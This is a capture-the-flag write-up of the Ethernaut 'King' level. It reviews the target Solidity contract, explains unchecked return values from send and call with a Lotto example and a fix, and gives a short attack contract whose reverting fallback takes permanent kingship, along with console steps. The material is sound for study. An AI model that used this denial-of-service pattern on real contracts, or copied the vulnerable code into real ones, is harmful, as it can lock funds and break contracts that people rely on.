<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

Challenge's message.

>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
Such a fun game. Your goal is to break it.
When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


At the beginning of the contract, there are defined variables such as king, owner and prize. Also, these variables are assigned when the contract is created in the payable constructor. After the definition of king and king's prize, there is a specific function called ``receive()``that works to remand the new king's prize to the ex-king address and update the new king address and king's prize when someone is the owner or sends more than the king's ether to the contract. And finally, there is a function which returns us to current king address.

As with every challenge, this contract has some potential issues. One of these issues like forgot to check the external process status. Here we go...

# Subverting

Before talking about my attack contract, I want to explain some topics. If you know about the vulnerability of **uncheck calls returns value**, you would skip this part.

### Calls In Solidity 

There are a number of ways of performing external calls in Solidity. Sending ether to external accounts is commonly performed via the ``transfer`` method. However, the ``send`` function can also be used, and for more versatile external calls the ``call`` **opcode** can be directly employed in Solidity. You can start an external calls in the contract with send ether to other contracts by

  - ``transfer`` :  (2300 gas, throws error)
  - ``send`` : (2300 gas, returns bool)
  - ``call`` : (forward all gas or set gas, returns bool)

this methods. Here we can see that when we use to send or call to send ether or perform any transactions, it returns a boolean value i.e. true or false. Unless you check this return value, you will face something critical vulnerability.

### Security Issue : Uncheck Calls Returns Value

 The ``call`` and ``send`` functions return a boolean indicating whether the call succeeded or failed. As a result, if the call return value is not checked, execution will resume even if the called contract throws an exception. If the call fails accidentally or an attacker forces the call to fail, this may cause unexpected behavior in the subsequent program logic. Here is a contract which too has an example of this problem.
 
 ```solidity
 
contract Lotto {
    bool public payedOut = false;
    address public winner;
    uint public winAmount;

    // ... extra functionality here

    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(this.balance);
    }
}
 
 ```
 This represents a Lotto-like contract, where a ``winner`` receives ``winAmount`` of ether, which typically leaves a little left over for anyone to withdraw.

The vulnerability exists on sendToWinner() function, where a send is used without checking the response. In this example, a winner whose transaction fails (either by running out of gas or by being a contract that intentionally throws in the fallback function) allows ``payedOut`` to be set to ``true`` regardless of whether ether was sent or not. In this case, **anyone can withdraw the winner’s winnings via the withdrawLeftOver function**.

### Prevention

Actually, this vulnerability easily fix it. The only thing must to do is check the returns value of the process and set the gas limit of transaction. Here is basic example of this solution.

```solidity

// Vulnerable Code

  function Transfer(address _a)public{
      (bool success, bytes memory data) = _a.call{value: msg.value,gas: 5000}();
  }

```

```solidity

// Safe Code

function Transfer(address _a)public{
      (bool success, bytes memory data) = _a.call{value: msg.value,gas: 5000}();
      require(success,"Transfer failed");
  }

```
As you see in the contracts, just require check and gas limit resolve the problem.
## Attack Contract

Here is my attack contract.

```solidity
pragma solidity ^0.8.0;

import './King.sol';

contract Attack{

    constructor(address payable _target) payable{
        address(_target).call{value: msg.value}("");
    }

    fallback()external{
        revert("Hack ponzi");
    }
}
```

First thing first is as always solidity version and import our target contract's file into attack contract. After that, get the instance of target contract and call it with sending more than king's prize in the constructor. When the ``call`` method works, the target contract will send ether to ex king's address and updated the attack contract as new king. Also, when someone wants to be a new king of target contract, he/she won't be a new king because of our fallback() function will have blocked this process. 

To explain more clearly, if the target contract change to kingship as different from attack contract, it will send ether to this contract but in the fallback() will have reverted to transaction. In this way, we'll stay king of the target contract every time.

### Attack Senario

Check the king of target contarct.

```shell
await contract._king()
'0x3049C00639E6dfC269ED1451764a046f7aE500c6'
```

Check the king's prize.

```shell

fromWei(await contract.prize())
'0.001'

```
When we deploy the attack contract, we must send higher than this price. It equals to 1000000000000000 wei. Let's send 2000000000000000 wei to attack contract's constructor and deploy it.

<p align="center"><img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/King/src/deploy.png"></p>

And we get kingship of the contract forever. As ponzi getsXD

```shell
await contract._king()
'0xE27F0dB592D69A14f5FD26ba434056e22C375388'
```

Challange's message.

> Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.
In this case, see: King of the Ether and King of the Ether Postmortem

**_by wasny0ps_**
